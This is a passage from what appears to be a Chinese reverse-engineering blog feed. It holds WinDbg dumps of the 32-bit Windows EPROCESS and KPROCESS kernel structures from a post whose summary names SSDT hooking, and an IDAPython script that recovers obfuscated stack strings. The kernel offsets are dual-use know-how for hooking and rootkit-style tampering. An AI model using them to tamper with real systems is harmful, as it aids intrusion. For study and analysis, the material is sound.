MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x1f0</span> SListFaultAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1f4</span> ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   +<span class="number">0x1f8</span> XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><p><code>EPROCESS</code>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS<span class="comment">//KPROCESS结构</span></span><br><span class="line">   +<span class="number">0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x0b4</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   +<span class="number">0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   +<span class="number">0x0f8</span> Token            : _EX_FAST_REF</span><br><span class="line">   +<span class="number">0x0fc</span> WorkingSetPage   : Uint4B</span><br><span class="line">   +<span class="number">0x100</span> AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x104</span> RotateInProgress : Ptr32 _ETHREAD</span><br><span class="line">   +<span class="number">0x108</span> ForkInProgress   : Ptr32 _ETHREAD</span><br><span class="line">   +<span class="number">0x10c</span> HardwareTrigger  : Uint4B</span><br><span class="line">   +<span class="number">0x110</span> PhysicalVadRoot  : Ptr32 _MM_AVL_TABLE</span><br><span class="line">   +<span class="number">0x114</span> CloneRoot        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x118</span> NumberOfPrivatePages : Uint4B</span><br><span class="line">   +<span class="number">0x11c</span> NumberOfLockedPages : Uint4B</span><br><span class="line">   +<span class="number">0x120</span> Win32Process     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x124</span> Job              : Ptr32 _EJOB</span><br><span class="line">   +<span class="number">0x128</span> SectionObject    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x12c</span> SectionBaseAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x130</span> Cookie           : Uint4B</span><br><span class="line">   +<span class="number">0x134</span> Spare8           : Uint4B</span><br><span class="line">   +<span class="number">0x138</span> WorkingSetWatch  : Ptr32 _PAGEFAULT_HISTORY</span><br><span class="line">   +<span class="number">0x13c</span> Win32WindowStation : Ptr32 Void</span><br><span class="line">   +<span class="number">0x140</span> InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class="line">   +<span class="number">0x144</span> LdtInformation   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x148</span> VdmObjects       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x14c</span> ConsoleHostProcess : Uint4B</span><br><span class="line">   +<span class="number">0x150</span> DeviceMap        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x154</span> EtwDataSource    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x158</span> FreeTebHint      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x160</span> PageDirectoryPte : _HARDWARE_PTE</span><br><span class="line">   +<span class="number">0x160</span> Filler           : Uint8B</span><br><span class="line">   +<span class="number">0x168</span> Session          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x16c</span> ImageFileName    : [<span class="number">15</span>] UChar</span><br><span class="line">   +<span class="number">0x17b</span> PriorityClass    : UChar</span><br><span class="line">   +<span class="number">0x17c</span> JobLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x184</span> LockedPagesList  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x188</span> ThreadListHead   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x190</span> SecurityPort     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x194</span> PaeTop           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x198</span> ActiveThreads    : Uint4B</span><br><span class="line">   +<span class="number">0x19c</span> ImagePathHash    : Uint4B</span><br><span class="line">   +<span class="number">0x1a0</span> DefaultHardErrorProcessing : Uint4B</span><br><span class="line">   +<span class="number">0x1a4</span> LastThreadExitStatus : Int4B</span><br><span class="line">   +<span class="number">0x1a8</span> Peb              : Ptr32 _PEB</span><br><span class="line">   +<span class="number">0x1ac</span> PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">   +<span class="number">0x1b0</span> ReadOperationCount : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1b8</span> WriteOperationCount : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1c0</span> OtherOperationCount : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1c8</span> ReadTransferCount : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1d0</span> WriteTransferCount : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1d8</span> OtherTransferCount : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1e0</span> CommitChargeLimit : Uint4B</span><br><span class="line">   +<span class="number">0x1e4</span> CommitChargePeak : Uint4B</span><br><span class="line">   +<span class="number">0x1e8</span> AweInfo          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1ec</span> SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">   +<span class="number">0x1f0</span> Vm               : _MMSUPPORT</span><br><span class="line">   +<span class="number">0x25c</span> MmProcessLinks   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x264</span> HighestUserAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x268</span> ModifiedPageCount : Uint4B</span><br><span class="line">   +<span class="number">0x26c</span> Flags2           : Uint4B</span><br><span class="line">   +<span class="number">0x26c</span> JobNotReallyActive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> AccountingFolded : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> NewProcessReported : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> ExitProcessReported : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> ReportCommitChanges : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> LastReportMemory : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> ReportPhysicalPageChanges : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> HandleTableRundown : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> NeedsHandleRundown : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> RefTraceEnabled  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> NumaAware        : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> ProtectedProcess : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> DefaultPagePriority : Pos <span class="number">12</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x26c</span> PrimaryTokenFrozen : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> ProcessVerifierTarget : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> StackRandomizationDisabled : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> AffinityPermanent : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> AffinityUpdateEnable : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> PropagateNode    : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x26c</span> ExplicitAffinity : Pos <span class="number">21</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x270</span> CreateReported   : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> NoDebugInherit   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> ProcessExiting   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> ProcessDelete    : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> Wow64SplitPages  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> VmDeleted        : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> OutswapEnabled   : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> Outswapped       : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> ForkFailed       : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> Wow64VaSpace4Gb  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> AddressSpaceInitialized : Pos <span class="number">10</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x270</span> SetTimerResolution : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> BreakOnTermination : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> DeprioritizeViews : Pos <span class="number">14</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> WriteWatch       : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> ProcessInSession : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> OverrideAddressSpace : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> HasAddressSpace  : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> LaunchPrefetched : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> InjectInpageErrors : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> VmTopDown        : Pos <span class="number">21</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> ImageNotifyDone  : Pos <span class="number">22</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> PdeUpdateNeeded  : Pos <span class="number">23</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> VdmAllowed       : Pos <span class="number">24</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> CrossSessionCreate : Pos <span class="number">25</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> ProcessInserted  : Pos <span class="number">26</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> DefaultIoPriority : Pos <span class="number">27</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x270</span> ProcessSelfDelete : Pos <span class="number">30</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x270</span> SetTimerResolutionLink : Pos <span class="number">31</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x274</span> ExitStatus       : Int4B</span><br><span class="line">   +<span class="number">0x278</span> VadRoot          : _MM_AVL_TABLE</span><br><span class="line">   +<span class="number">0x298</span> AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">   +<span class="number">0x2a8</span> TimerResolutionLink : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x2b0</span> RequestedTimerResolution : Uint4B</span><br><span class="line">   +<span class="number">0x2b4</span> ActiveThreadsHighWatermark : Uint4B</span><br><span class="line">   +<span class="number">0x2b8</span> SmallestTimerResolution : Uint4B</span><br><span class="line">   +<span class="number">0x2bc</span> TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD</span><br></pre></td></tr></table></figure><p><code>KPROCESS</code>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPROCESS</span><br><span class="line">nt!_KPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> ProfileListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> DirectoryTableBase : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> LdtDescriptor    : _KGDTENTRY</span><br><span class="line">   +<span class="number">0x024</span> Int21Descriptor  : _KIDTENTRY</span><br><span class="line">   +<span class="number">0x02c</span> ThreadListHead   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x034</span> ProcessLock      : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> Affinity         : _KAFFINITY_EX</span><br><span class="line">   +<span class="number">0x044</span> ReadyListHead    : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x04c</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x050</span> ActiveProcessors : _KAFFINITY_EX</span><br><span class="line">   +<span class="number">0x05c</span> AutoAlignment    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x05c</span> DisableBoost     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x05c</span> DisableQuantum   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x05c</span> ActiveGroupsMask : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x05c</span> ReservedFlags    : Pos <span class="number">4</span>, <span class="number">28</span> Bits</span><br><span class="line">   +<span class="number">0x05c</span> ProcessFlags     : Int4B</span><br><span class="line">   +<span class="number">0x060</span> BasePriority     : Char</span><br><span class="line">   +<span class="number">0x061</span> QuantumReset     : Char</span><br><span class="line">   +<span class="number">0x062</span> Visited          : UChar</span><br><span class="line">   +<span class="number">0x063</span> Unused3          : UChar</span><br><span class="line">   +<span class="number">0x064</span> ThreadSeed       : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x068</span> IdealNode        : [<span class="number">1</span>] Uint2B</span><br><span class="line">   +<span class="number">0x06a</span> IdealGlobalNode  : Uint2B</span><br><span class="line">   +<span class="number">0x06c</span> Flags            : _KEXECUTE_OPTIONS</span><br><span class="line">   +<span class="number">0x06d</span> Unused1          : UChar</span><br><span class="line">   +<span class="number">0x06e</span> IopmOffset       : Uint2B</span><br><span class="line">   +<span class="number">0x070</span> Unused4          : Uint4B</span><br><span class="line">   +<span class="number">0x074</span> StackCount       : _KSTACK_COUNT</span><br><span class="line">   +<span class="number">0x078</span> ProcessListEntry : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x080</span> CycleTime        : Uint8B</span><br><span class="line">   +<span class="number">0x088</span> KernelTime       : Uint4B</span><br><span class="line">   +<span class="number">0x08c</span> UserTime         : Uint4B</span><br><span class="line">   +<span class="number">0x090</span> VdmTrapcHandler  : Ptr32 Void</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSDT-HOOK&quot;&gt;&lt;a href=&quot;#SSDT-HOOK&quot; class=&quot;headerlink&quot; title=&quot;SSDT_HOOK&quot;&gt;&lt;/a&gt;SSDT_HOOK&lt;/h2&gt;&lt;p&gt;SSDT  原理其实很简单，首先通过API拿到ETRHEAD结构地址，通过结构成员拿
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="驱动程序" scheme="http://yeanhoo.gitee.io/tags/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="SSDTHOOK" scheme="http://yeanhoo.gitee.io/tags/SSDTHOOK/"/>
    
  </entry>
  
  <entry>
    <title>IDA--pthon学习--函数变量去混淆</title>
    <link href="http://yeanhoo.gitee.io/2021/04/24/IDA--pthon%E5%AD%A6%E4%B9%A0--%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F%E5%8E%BB%E6%B7%B7%E6%B7%86/"/>
    <id>http://yeanhoo.gitee.io/2021/04/24/IDA--pthon%E5%AD%A6%E4%B9%A0--%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F%E5%8E%BB%E6%B7%B7%E6%B7%86/</id>
    <published>2021-04-24T13:29:25.558Z</published>
    <updated>2021-04-24T13:33:34.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDA–pthon学习–函数变量去混淆"><a href="#IDA–pthon学习–函数变量去混淆" class="headerlink" title="IDA–pthon学习–函数变量去混淆"></a>IDA–pthon学习–函数变量去混淆</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>IDA python</code>在2004年被开发出来，其目的是为了将<code>python</code>语言的简洁强大和IDA支持的IDC语言结合起来。</p><p><code>IDA python</code>其实主要用到的如下三个模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. idc：这是兼容idc函数的模块  </span><br><span class="line">2. idautils：大多数处理都是需要依托于这个模块  </span><br><span class="line">3. idaapi：允许使用者通过类的形式，访问更多底层的数据</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():<span class="comment">#遍历函数</span></span><br><span class="line">idaapi.get_func(func_addr)<span class="comment">#解析函数</span></span><br><span class="line">idc.GetMnem(start)<span class="comment">#获取指令操作码</span></span><br><span class="line">idc.print_operand(start, <span class="number">0</span>)<span class="comment">#可以理解为目的操作数</span></span><br><span class="line">idc.get_operand_value(start, <span class="number">1</span>)<span class="comment">#可以理解为源操作数</span></span><br><span class="line">idc.get_item_size(start)<span class="comment">#获取指令长度</span></span><br><span class="line">idc.GetFunctionName(func)<span class="comment">#获取函数名称</span></span><br><span class="line">idc.GetDisasm(start)<span class="comment">#获取反汇编</span></span><br><span class="line">idc.SegName()<span class="comment">#获取数据段名称</span></span><br><span class="line">idc.GetOpType(ea,n)<span class="comment">#可以判断操作数类型如普通寄存器</span></span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>尝试编写脚本去除函数局部变量混淆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findstrings</span><span class="params">(func_addr)</span>:</span></span><br><span class="line">    stackvars = &#123;&#125;</span><br><span class="line">    <span class="keyword">print</span> hex(func_addr), idc.GetFunctionName(func_addr)</span><br><span class="line">    func = idaapi.get_func(func_addr)</span><br><span class="line">    start = func.startEA</span><br><span class="line">    end = func.endEA</span><br><span class="line">    <span class="keyword">while</span>(start &lt; end):</span><br><span class="line">        <span class="keyword">if</span>( (idc.GetMnem(start) == <span class="string">'mov'</span>) <span class="keyword">and</span> ( <span class="string">'ebp+var_'</span> <span class="keyword">in</span> idc.print_operand(start, <span class="number">0</span>))):</span><br><span class="line">            stackvars [str(idc.print_operand(start, <span class="number">0</span>))] = chr(idc.get_operand_value(start, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        start += idc.get_item_size(start)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> stackvars </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"*********************************"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"**********FIND_STRING***********"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"*********************************"</span>)</span><br><span class="line">li = []</span><br><span class="line">str1 = []</span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    stackvars =  findstrings(func)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> stackvars.keys():</span><br><span class="line">        li.append(key)</span><br><span class="line">    li.sort(reverse = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> ke <span class="keyword">in</span> li:</span><br><span class="line">        <span class="keyword">if</span> stackvars[ke].isalnum():</span><br><span class="line">            str1.append(stackvars[ke])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str1.append(<span class="string">'_'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(str1)</span><br></pre></td></tr></table></figure><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/idapython-1.png" alt></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>IDApython</code>主要就三大模块，实际使用起来和使用反汇编引擎类似，给定地址反汇编，根据需求进行更改或者注释即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;IDA–pthon学习–函数变量去混淆&quot;&gt;&lt;a href=&quot;#IDA–pthon学习–函数变量去混淆&quot; class=&quot;headerlink&quot; title=&quot;IDA–pthon学习–函数变量去混淆&quot;&gt;&lt;/a&gt;IDA–pthon学习–函数变量去混淆&lt;/h2&gt;&lt;h3 i
      
    
    </summary>
    
    
      <category term="技巧" scheme="http://yeanhoo.gitee.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="IDApython" scheme="http://yeanhoo.gitee.io/tags/IDApython/"/>
    
  </entry>
  
  <entry>
    <title>VAD概念</title>
    <link href="http://yeanhoo.gitee.io/2021/04/10/VAD%E6%A6%82%E5%BF%B5/"/>
    <id>http://yeanhoo.gitee.io/2021/04/10/VAD%E6%A6%82%E5%BF%B5/</id>
    <published>2021-04-10T07:41:08.650Z</published>
    <updated>2021-04-24T14:05:36.543Z</updated>
    
